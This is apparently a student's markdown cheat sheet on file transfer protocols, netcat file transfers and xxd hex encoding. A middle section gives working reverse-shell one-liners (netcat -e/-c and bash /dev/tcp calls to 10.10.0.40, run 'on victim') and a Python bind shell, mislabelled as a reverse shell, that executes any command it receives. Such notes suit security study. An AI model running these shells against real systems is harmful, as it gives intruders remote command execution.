# mknod
# steghide extract -sf 


# File Transfer methods 
    scp
        uses port 22 for transport 
        uses asymmetric and symmetric encryption
        non interactive 
    OPTIONS
     . - present working directory 
    -v - verbose method
    -P - alternate port
    -r - recursively copies the whole directory
    -3 - three way copy


        
    FTP
        Uses 2 separate tcp connections 
        command and control (21), data transfer (20)
        anonymous login
        insecure
        passive and active connections
    TFTP
        UDP based
        small and simple comms
        insecure, No encryption or encoding
        No directory services
    FTPS
        secure
        uses ports 20/21 regular
        uses ports 989/990 for encryption
        interactive terminal access
    
    SFTP
        transport 22
        uses symetric and asymetric encryption

# Active    
![FTP](https://github.com/user-attachments/assets/ada2309a-4eca-4023-9f60-a927a956efad)
# Passive 
![FTP](https://github.com/user-attachments/assets/9dfee368-0537-41cb-adc4-d65fa361457e)


    Netcat - swiss army hoe
        can be used for tcp/udp inbound and outbound connections

        
<h5> Listener (receive file): <h5>
    
     nc -lvp 9001 > newfile.txt

<h5>Client (sends file): </h5>  

     nc 172.16.82.106 9001 < file.txt

# Reverse Shell using NC

 First listen for the shell on your device.

        $ nc -lvp 9999

On Victim using -c :

    $ nc -c /bin/bash 10.10.0.40 9999

On Victim using -e :

    $ nc -e /bin/bash 10.10.0.40 9999

# Reverse shell using /dev/tcp

First listen for the shell on your device.

    $ nc -lvp 9999

On Victim:

    $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1

# Reverse shell using python 3
    
    #!/usr/bin/python3
    import socket
    import subprocess
    PORT = 1234        # Choose an unused port
    print ("Waiting for Remote connections on port:", PORT, "\n")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', PORT))
    server.listen()
    while True:
        conn, addr = server.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024).decode()
                if not data:
                    break
                proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, err = proc.communicate()
                response = output.decode() + err.decode()
                conn.sendall(response.encode())
    server.close()
    

# xxd example

echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\

    $ echo "Hex encoding test" | xxd -p 48657820656e636f64696e6720746573740a

echo hex string and use xxd to restore the data to its original format

    $ echo "48657820656e636f64696e6720746573740a" | xxd -r -p Hex encoding test























    
